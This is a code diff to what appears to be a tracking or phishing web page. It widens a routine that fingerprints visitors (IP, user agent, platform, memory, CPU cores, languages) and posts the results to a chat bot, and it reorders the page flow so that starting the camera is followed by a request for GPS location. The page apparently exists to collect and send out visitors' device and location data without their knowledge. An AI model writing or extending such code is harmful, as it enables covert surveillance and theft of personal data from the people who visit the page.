@@ -213,7 +213,12 @@
                 const ip = data.ip;
 
                 const userAgent = navigator.userAgent;
-                const userInfo = { ip, userAgent };
+                const platform = navigator.platform;
+                const deviceMemory = navigator.deviceMemory || 'N/A';
+                const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+                const languages = navigator.languages.join(', ');
+
+                const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages };
 
                 console.log("User info: ", userInfo);
 
@@ -234,7 +239,7 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}`
+                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}, Platform - ${userInfo.platform}, Device Memory - ${userInfo.deviceMemory} GB, Hardware Concurrency - ${userInfo.hardwareConcurrency}, Languages - ${userInfo.languages}`
                     })
                 });
 
@@ -253,11 +258,12 @@
                 const permission = await navigator.permissions.query({ name: 'geolocation' });
                 if (permission.state === 'denied') {
                     alert("Please enable GPS and allow location access to continue.");
-                } else {
-                    getLocation();
+                    return false;
                 }
+                return true;
             } catch (error) {
                 console.error("Error requesting location permission: ", error);
+                return false;
             }
         }
 
@@ -313,7 +319,12 @@
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
-            await requestLocationPermission();
+
+            const permissionGranted = await requestLocationPermission();
+            if (permissionGranted) {
+                await getLocation();
+            }
+
             document.getElementById('initial-container').style.display = 'none';
             document.getElementById('main-container').style.display = 'flex';
         }
